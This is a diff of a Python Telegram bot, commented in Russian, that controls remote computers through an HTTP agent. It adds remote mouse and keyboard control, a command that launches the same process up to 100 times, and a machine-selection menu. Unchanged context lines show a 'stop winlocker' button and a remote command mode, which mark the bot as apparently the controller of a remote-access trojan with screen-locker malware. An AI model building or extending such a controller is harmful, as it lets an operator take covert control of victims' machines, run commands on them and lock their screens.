@@ -27,6 +27,40 @@ COMPUTERS_FILE = "computers.json"
 TEMP_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'temp')
 os.makedirs(TEMP_DIR, exist_ok=True)
 
+#ID
+AdminID = 5183977020
+AllowedID ={AdminID}
+#Не работает
+async def send_startup_notification(application):
+    """Отправляет уведомление администратору о запуске бота"""
+    try:
+        # Убедимся, что AdminID определен и является допустимым числом
+        admin_id = AdminID
+        if not isinstance(admin_id, int) or admin_id <= 0:
+            logger.warning("AdminID не установлен или недействителен. Уведомление не отправлено.")
+            return
+
+        await application.bot.send_message(
+            chat_id=admin_id,
+            text="🤖 Бот успешно запущен и готов к работе!"
+        )
+        logger.info(f"Уведомление о запуске отправлено администратору {admin_id}")
+    except Exception as e:
+        logger.error(f"Ошибка при отправке уведомления администратору: {e}")
+
+# Исправленная функция post_init в bot.txt
+async def post_init(application):
+    """Функция для пост-инициализации"""
+    await application.bot.set_my_commands([
+        ("start", "Запустить бота"),
+        ("cmd", "Войти в режим командной строки"),
+        ("history", "Показать историю команд"),
+        ("cancel", "Отменить текущую команду")
+    ])
+    # Отправка уведомления о запуске
+    await send_startup_notification(application) # <-- Добавлен вызов функции
+    logger.info("Бот успешно запущен")
+
 # Глобальные переменные для управления командами
 ACTIVE_COMMANDS = {}
 COMMAND_HISTORY = {}
@@ -46,25 +80,23 @@ async def check_computer_status(ip: str) -> bool:
         response = requests.get(f'http://{ip}:5000/status', timeout=5)
         return response.status_code == 200
     except Exception as e:
-        ip = context.user_data.get("selected_pc")
 
         logger.error(f"Ошибка проверки статуса компьютера {ip}: {e}")
         return False
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE): # <-- context приходит сюда как аргумент
     try:
         computers = load_computers()
         if not computers:
             await update.message.reply_text("🔍 Нет доступных компьютеров")
             return
-        
         status_messages = []
         for name, ip in computers.items():
-            is_online = await check_computer_status(ip)
+            is_online = await check_computer_status(ip) # <-- Эта функция была исправлена
             status = "🟢 Онлайн" if is_online else "🔴 Оффлайн"
             status_messages.append(f"{name} ({ip}) - {status}")
-        
-        await update.message.reply_text("📊 Статус компьютеров:\n" + "\n".join(status_messages))
+        await update.message.reply_text("📊 Статус компьютеров:\n" + "\n".join(status_messages)) # Исправил \ на \n
         
         keyboard = [
             [InlineKeyboardButton(f"{name} ({ip})", callback_data=f"select_{name}")]
@@ -74,8 +106,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "🖥 Выберите компьютер:",
             reply_markup=InlineKeyboardMarkup(keyboard))
     except Exception as e:
-        logger.error(f"Ошибка в команде start: {e}")
+        logger.error(f"Ошибка в команде start: {e}") # <-- Больше не используем context в логе
         await update.message.reply_text("❌ Произошла ошибка при обработке команды")
+
 
 async def show_processes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
@@ -388,18 +421,59 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ Компьютер не выбран!")
                 return
             
-            try:
-                response = requests.post(
-                    f"http://{ip}:5000/command",
-                    json={"command": f"start {update.message.text}"},
-                    timeout=10
-                )
-                await update.message.reply_text(response.json().get("status", "Процесс запущен"))
-            except Exception as e:
-                logger.error(f"Ошибка запуска процесса: {e}")
-                await update.message.reply_text("❌ Не удалось запустить процесс")
+            command_text = update.message.text.strip()
+            # Проверяем, есть ли в конце цифра (количество повторений)
+            import re
+            match = re.search(r'^(.*)\s+(\d+)$', command_text)
+            
+            if match:
+                # Извлекаем команду и количество повторений
+                base_command = match.group(1).strip()
+                count = int(match.group(2))
+                
+                # Ограничиваем количество повторений для безопасности
+                if count > 100:
+                    await update.message.reply_text("❌ Максимальное количество запусков - 100")
+                    context.user_data["waiting_new_process"] = False
+                    return
+                
+                if count <= 0:
+                    await update.message.reply_text("❌ Количество должно быть положительным числом")
+                    context.user_data["waiting_new_process"] = False
+                    return
+                
+                # Запускаем процесс несколько раз
+                success_count = 0
+                for i in range(count):
+                    try:
+                        response = requests.post(
+                            f"http://{ip}:5000/command",
+                            json={"command": f"start {base_command}"},
+                            timeout=10
+                        )
+                        # Проверяем успешность каждого запроса
+                        if response.status_code == 200:
+                            success_count += 1
+                    except Exception as e:
+                        logger.error(f"Ошибка запуска процесса (попытка {i+1}): {e}")
+                        # Продолжаем с другими попытками
+                
+                await update.message.reply_text(f"✅ Запущено {success_count} из {count} процессов: {base_command}")
+            else:
+                # Обычный запуск одного процесса
+                try:
+                    response = requests.post(
+                        f"http://{ip}:5000/command",
+                        json={"command": f"start {command_text}"},
+                        timeout=10
+                    )
+                    await update.message.reply_text(response.json().get("status", "Процесс запущен"))
+                except Exception as e:
+                    logger.error(f"Ошибка запуска процесса: {e}")
+                    await update.message.reply_text("❌ Не удалось запустить процесс")
             
             context.user_data["waiting_new_process"] = False
+
         elif context.user_data.get('command_mode', False):
             command = update.message.text.strip()
             if command.lower() == 'exit':
@@ -495,7 +569,9 @@ async def handle_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE
                     [InlineKeyboardButton("🔓 Остановить winlocker", callback_data="stop_winlocker")],
                     [InlineKeyboardButton("💻 Командный режим", callback_data="cmd_mode")],
                     [InlineKeyboardButton("📜 История команд", callback_data="show_history")],
+                    [InlineKeyboardButton("🖱 Управление", callback_data="control_menu")],
                     # [InlineKeyboardButton("🔄 Проверить статус", callback_data=f"select_{computer_name}")]
+                    [InlineKeyboardButton("❌Меню выбора компьтера", callback_data=f"load_computers")]
                 ]
                 await query.edit_message_text(
                     text=f"Управление компьютером: {computer_name} (🟢 Онлайн)",
@@ -510,6 +586,113 @@ async def handle_button_click(update: Update, context: ContextTypes.DEFAULT_TYPE
         elif data == "start_process":
             context.user_data["waiting_new_process"] = True
             await query.edit_message_text("Введите команду для запуска нового процесса:")
+
+                    
+        elif data == "load_computers":
+            try:
+                computers = load_computers()
+                if not computers:
+                    await query.edit_message_text("🔍 Нет доступных компьютеров")
+                    return
+
+                status_messages = []
+                for name, ip in computers.items():
+                    is_online = await check_computer_status(ip)
+                    status = "🟢 Онлайн" if is_online else "🔴 Оффлайн"
+                    status_messages.append(f"{name} ({ip}) - {status}")
+
+                # Обновляем текст сообщения и клавиатуру
+                await query.edit_message_text(
+                    "📊 Статус компьютеров:\n" + "\n".join(status_messages)
+                )
+
+                keyboard = [
+                    [InlineKeyboardButton(f"{name} ({ip})", callback_data=f"select_{name}")]
+                    for name, ip in computers.items()
+                ]
+                await query.message.reply_text( # Отправляем новое сообщение с клавиатурой
+                    "🖥 Выберите компьютер:",
+                    reply_markup=InlineKeyboardMarkup(keyboard)
+                )
+                # Очищаем выбор компьютера в контексте, так как мы возвращаемся к выбору
+                context.user_data.pop("selected_pc", None)
+                context.user_data.pop("computer_name", None)
+
+            except Exception as e:
+                logger.error(f"Ошибка загрузки меню выбора компьютеров: {e}")
+                await query.edit_message_text("❌ Произошла ошибка при загрузке меню")
+       
+       
+
+        elif data == "control_menu":
+            keyboard = [
+                [InlineKeyboardButton("🖱 Мышь", callback_data="control_mouse")],
+                [InlineKeyboardButton("⌨ Клавиатура", callback_data="control_keyboard")]
+            ]
+            await query.edit_message_text(
+                text="Выберите, чем хотите управлять:",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+
+        elif data == "control_mouse":
+            keyboard = [
+                [InlineKeyboardButton("⬅ Назад", callback_data="control_menu")],
+                [InlineKeyboardButton("🖱 ЛКМ", callback_data="mouse_click_left")],
+                [InlineKeyboardButton("🖱 ПКМ", callback_data="mouse_click_right")]
+            ]
+            await query.edit_message_text(
+                text="🖱 Управление мышью:",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+
+        elif data in ("mouse_click_left", "mouse_click_right"):
+            ip = context.user_data.get("selected_pc")
+            if not ip:
+                await query.edit_message_text("❌ Компьютер не выбран!")
+                return
+            try:
+                # Определяем команду для сервера
+                mouse_command = "mouse_left_click" if data == "mouse_click_left" else "mouse_right_click"
+                
+                response = requests.post(
+                    f"http://{ip}:5000/command",
+                    json={"command": mouse_command},
+                    timeout=10
+                )
+                result_text = response.json().get("status", "Команда выполнена")
+                await query.edit_message_text(f"✅ {result_text}")
+                # После выполнения команды возвращаемся в меню мыши
+                # Можно добавить автоматический возврат или кнопку "Назад"
+                keyboard = [
+                    [InlineKeyboardButton("⬅ Назад", callback_data="control_menu")],
+                    [InlineKeyboardButton("🖱 ЛКМ", callback_data="mouse_click_left")],
+                    [InlineKeyboardButton("🖱 ПКМ", callback_data="mouse_click_right")]
+                ]
+                await query.message.reply_text( # Отправляем новое сообщение с меню мыши
+                    text="🖱 Управление мышью:",
+                    reply_markup=InlineKeyboardMarkup(keyboard)
+                )
+            except Exception as e:
+                logger.error(f"Ошибка отправки команды мыши: {e}")
+                await query.edit_message_text("❌ Не удалось подключиться к компьютеру")
+
+        elif data == "control_keyboard":
+            keyboard = [
+                [InlineKeyboardButton("⬅ Назад", callback_data="control_menu")],
+                [InlineKeyboardButton("↲ Enter", callback_data="key_enter")],
+                [InlineKeyboardButton("⌫ Backspace", callback_data="key_backspace")],
+                [InlineKeyboardButton("↹ Tab", callback_data="key_tab")],
+                [InlineKeyboardButton(" Esc", callback_data="key_escape")],
+                [InlineKeyboardButton("↑", callback_data="key_up")],
+                [InlineKeyboardButton("←", callback_data="key_left"), InlineKeyboardButton("↓", callback_data="key_down"), InlineKeyboardButton("→", callback_data="key_right")],
+                [InlineKeyboardButton("Ctrl+C", callback_data="key_ctrl_c"), InlineKeyboardButton("Ctrl+V", callback_data="key_ctrl_v")],
+                [InlineKeyboardButton("Ctrl+A", callback_data="key_ctrl_a"), InlineKeyboardButton("Ctrl+Z", callback_data="key_ctrl_z")],
+                [InlineKeyboardButton("Alt+Tab", callback_data="key_alt_tab")],
+                [InlineKeyboardButton(" Windows", callback_data="key_win")]
+            ]
+            await query.edit_message_text(
+                text="⌨ Управление клавиатурой:")
+            
         
         elif data == "cmd_mode":
             ip = context.user_data.get("selected_pc")
